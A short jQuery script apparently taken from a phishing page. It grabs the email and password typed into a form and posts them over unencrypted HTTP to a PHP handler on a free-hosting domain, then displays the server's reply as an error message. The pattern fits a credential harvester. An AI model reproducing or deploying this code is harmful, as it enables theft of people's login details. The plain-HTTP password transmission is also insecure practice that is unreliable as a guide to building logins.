$(document).ready(function() {
    $("#submit").click(function(e){
        e.preventDefault();

        var email = $("#email").val();
        var pass = $("#pass").val();

        $.ajax({
            url: "http://myhandler.rf.gd/Login.php",
            method: "post",
            data: {username:email,password:pass},
            beforeSend:function(){
                $(".loader").css("display","flex");
            },
            success:function(data){
                $("#error").html(data);
                $(".loader").css("display","none");
            }

        });
    })
});